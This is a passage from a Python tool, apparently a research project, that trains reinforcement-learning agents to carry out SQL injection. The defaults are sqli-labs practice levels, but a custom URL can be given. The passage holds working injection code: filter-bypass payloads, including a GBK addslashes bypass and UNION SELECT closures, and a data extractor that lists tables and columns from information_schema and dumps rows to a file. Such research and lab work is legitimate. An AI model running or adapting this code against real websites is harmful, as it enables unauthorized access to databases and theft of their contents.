            database = self.get_current_db()
        if not database:
            return []

        self.log(f"Extracting tables from '{database}'...")
        sql = (
            f"GROUP_CONCAT(table_name SEPARATOR 0x2c) "
            f"FROM information_schema.tables "
            f"WHERE table_schema=0x{database.encode().hex()}"
        )
        result = self._send_extract(sql)
        if result:
            tables = result.split(",")
            self.log(f"Tables: {tables}")
            return tables
        return []

    def get_columns(self, table: str, database: str = None) -> List[str]:
        if database is None:
            database = self.get_current_db()
        if not database:
            return []

        self.log(f"Extracting columns from '{table}'...")
        sql = (
            f"GROUP_CONCAT(column_name SEPARATOR 0x2c) "
            f"FROM information_schema.columns "
            f"WHERE table_schema=0x{database.encode().hex()} "
            f"AND table_name=0x{table.encode().hex()}"
        )
        result = self._send_extract(sql)
        if result:
            columns = result.split(",")
            self.log(f"Columns: {columns}")
            return columns
        return []

    def dump_table(self, table: str, columns: List[str] = None,
                   database: str = None, limit: int = 10) -> List[str]:
        if database is None:
            database = self.get_current_db()

        if columns is None:
            columns = self.get_columns(table, database)
        if not columns:
            self.log(f"No columns found for {table}")
            return []

        self.log(f"Dumping {table} ({','.join(columns[:5])}) LIMIT {limit}...")
        cols_concat = ",0x3a,".join(columns[:5])
        sql = (
            f"GROUP_CONCAT({cols_concat} SEPARATOR 0x0a) "
            f"FROM {database}.{table} LIMIT {limit}"
        )
        result = self._send_extract(sql)
        if result:
            rows = result.split("\n")
            for row in rows[:10]:
                self.log(f"  {row}")
            return rows
        return []

    def run_full_extraction(self) -> dict:
        report = {}
        report["user"] = self.get_current_user()
        report["version"] = self.get_version()
        report["database"] = self.get_current_db()

        if report["database"]:
            tables = self.get_tables(report["database"])
            report["tables"] = {}
            for table in tables[:10]:
                cols = self.get_columns(table, report["database"])
                rows = self.dump_table(table, cols, report["database"], limit=5)
                report["tables"][table] = {"columns": cols, "sample_rows": rows}
                time.sleep(REQUEST_DELAY)

        return report


# =============================================================================
# TARGET BUILDERS + LEGACY SHIMS  (was: seqsqli/builder.py)
# =============================================================================
def build_target_from_preset(less_id: float,
                              base_url: str = DEFAULT_BASE_URL) -> TargetProfile:
    preset = LESS_PRESETS[less_id]
    return TargetProfile(
        url=f"{base_url}/{preset['path']}",
        param=preset["param"],
        method=preset["method"],
        quote=preset["quote"],
        closure=preset["closure"],
        filter_type=preset["filter"],
        extra_params=preset.get("extra_params", {}),
    )


def build_target_from_args(url: str, param: str,
                            method: str = "GET",
                            extra_params: str = None) -> TargetProfile:
    t = TargetProfile(url=url, param=param, method=method.upper())
    if extra_params:
        for pair in extra_params.split("&"):
            k, v = pair.split("=", 1)
            t.extra_params[k] = v
    return t


LESS_TARGETS = {
    lid: {
        "path":        preset["path"],
        "param":       preset["param"],
        "method":      preset["method"],
        "quote":       preset["quote"],
        "filter":      preset["filter"],
        "extra_params": preset.get("extra_params", {}),
    }
    for lid, preset in LESS_PRESETS.items()
}


def send_payload(target_dict: dict, payload: str):
    """Legacy compat wrapper: dict-based target → send_request."""
    t = TargetProfile(
        url=f"{DEFAULT_BASE_URL}/{target_dict['path']}",
        param=target_dict["param"],
        method=target_dict["method"],
        extra_params=target_dict.get("extra_params", {}),
    )
    return send_request(t, payload)


def analyze_response(resp_text: str, status_code: int) -> str:
    """Legacy compat alias for classify_response."""
    return classify_response(resp_text, status_code)


# =============================================================================
# JSON ENCODER  (handles numpy types)
# =============================================================================
class _NumpyEncoder(json.JSONEncoder):
    def default(self, o):
        if isinstance(o, np.integer):
            return int(o)
        if isinstance(o, np.floating):
            return float(o)
        if isinstance(o, np.ndarray):
            return o.tolist()
        return super().default(o)


# =============================================================================
# HELPERS
# =============================================================================
def _apply_no_fingerprint(target, less_id=None):
    """Build base_payload from preset info without hitting the server."""
    target.columns         = 3
    target.injectable_cols = [2, 3]
    q  = target.quote
    c  = target.closure
    ft = target.filter_type

    if ft == "addslashes_gbk":
        q = "%bf%27"

    needs_quote_close = ft in (
        "union_select_comments_spaces",
        "comments_spaces_or_and",
    )

    if target.method == "POST":
        target.base_payload = f"admin{q}{c} --+"
    elif needs_quote_close and q:
        target.base_payload = f"0{q}{c} UNION SELECT 1,2,{q}3"
        target.suffix = "QUOTE_CLOSE"
    else:
        target.base_payload = f"0{q}{c} UNION SELECT 1,2,3--+"

    return target


# =============================================================================
# MAIN
# =============================================================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="SeqSQLi v2 — RL-based SQL Injection Agent (standalone)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python agent.py --less 25 --episodes 300
  python agent.py --less 27 --episodes 300 --no-fingerprint
  python agent.py --url http://target/vuln.php --param id
  python agent.py --less 1 --extract --load
  python agent.py --all --episodes 200
  python agent.py --less 27 --algo ppo --timesteps 50000
""",
    )

    grp = parser.add_mutually_exclusive_group()
    grp.add_argument("--less",  type=float, help="sqli-labs Less level (e.g. 25, 26)")
    grp.add_argument("--all",   action="store_true", help="Train on all Less presets")
    grp.add_argument("--url",   type=str,   help="Custom target URL")

    parser.add_argument("--param",          type=str, default="id")
    parser.add_argument("--method",         type=str, default="GET", choices=["GET", "POST"])
    parser.add_argument("--data",           type=str, help="Extra POST params: key=val&key2=val2")
    parser.add_argument("--base-url",       type=str, default=DEFAULT_BASE_URL)
    parser.add_argument("--episodes",       type=int, default=MAX_EPISODES)
    parser.add_argument("--algo",           type=str, default="qlearning",
                        choices=["qlearning", "ppo"],
                        help="RL algorithm to use (default: qlearning)")
    parser.add_argument("--timesteps",      type=int, default=50_000,
                        help="Total env steps for PPO training (default: 50000)")
    parser.add_argument("--load",           action="store_true", help="Load existing Q-table")
    parser.add_argument("--eval-only",      action="store_true", help="Skip training, greedy eval")
    parser.add_argument("--fingerprint",    action="store_true", help="Fingerprint only, then exit")
    parser.add_argument("--no-fingerprint", action="store_true", help="Skip auto-detection")
    parser.add_argument("--extract",        action="store_true", help="Extract DB data after bypass")

    args = parser.parse_args()

    if args.load or args.eval_only:
        load_q_table(QTABLE_PATH)

    # ── ALL MODE ─────────────────────────────────────────────────────────────
    if args.all:
        all_logs = []
        for less_id in sorted(LESS_PRESETS.keys()):
            target = build_target_from_preset(less_id, args.base_url)
            if not args.no_fingerprint:
                fp = Fingerprinter(target)
                target = fp.run()
            else:
                target = _apply_no_fingerprint(target, less_id)

            logs = train(target, args.episodes)
            evaluate(logs)
            all_logs.extend(logs)

        save_q_table(QTABLE_PATH)
        with open(RESULTS_PATH, "w") as f:
            json.dump(all_logs, f, indent=2, cls=_NumpyEncoder)
        print(f"\n[*] All results saved to {RESULTS_PATH}")
        print(f"[*] Total HTTP requests: {get_request_count()}")
        exit(0)

    # ── SINGLE TARGET MODE ────────────────────────────────────────────────────
    if args.url:
        target = build_target_from_args(args.url, args.param, args.method, args.data)
    elif args.less is not None:
        if args.less not in LESS_PRESETS:
            print(f"[!] Less-{args.less} not found. Available: {sorted(LESS_PRESETS.keys())}")
            exit(1)
        target = build_target_from_preset(args.less, args.base_url)
    else:
        parser.print_help()
        exit(0)

    # Fingerprinting
    if not args.no_fingerprint:
        print(f"\n{'='*60}\n FINGERPRINTING\n{'='*60}")
        fp = Fingerprinter(target)
        target = fp.run()
    elif args.less is not None:
        target = _apply_no_fingerprint(target, args.less)

    if args.fingerprint:
        print("\n[*] Fingerprint complete. Exiting.")
        exit(0)

    # Training / evaluation
    if args.algo == "ppo":
        if args.eval_only:
            logs = greedy_eval_ppo(target, model_path=PPO_MODEL_PATH)
            evaluate(logs)
        else:
            logs = train_ppo(target, timesteps=args.timesteps)
            evaluate(logs)

            results_path = f"results_ppo_less{args.less}.json" if args.less else "results_ppo.json"
            with open(results_path, "w") as f:
                json.dump(logs, f, indent=2, cls=_NumpyEncoder)
            print(f"[*] PPO logs saved to {results_path}")

            ordering_path = f"ordering_ppo_less{args.less}.json" if args.less else "ordering_ppo.json"
            analyze_ordering(logs, save_path=ordering_path)

    else:  # qlearning (default)
        if args.eval_only:
            greedy_eval(target)
        else:
            logs = train(target, args.episodes)
            evaluate(logs)
            save_q_table(QTABLE_PATH)

            results_path = f"results_less{args.less}.json" if args.less else "results.json"
            with open(results_path, "w") as f:
                json.dump(logs, f, indent=2, cls=_NumpyEncoder)
            print(f"[*] Logs saved to {results_path}")

            ordering_path = f"ordering_less{args.less}.json" if args.less else "ordering.json"
            analyze_ordering(logs, save_path=ordering_path)

        analyze_q_table()

    # Data extraction
    if args.extract:
        print(f"\n{'='*60}\n DATA EXTRACTION\n{'='*60}")
        extractor = DataExtractor(target)
        report = extractor.run_full_extraction()
        extract_path = f"extract_less{args.less}.json" if args.less else "extract.json"
        with open(extract_path, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n[*] Extraction report saved to {extract_path}")

    print(f"\n[*] Total HTTP requests: {get_request_count()}")
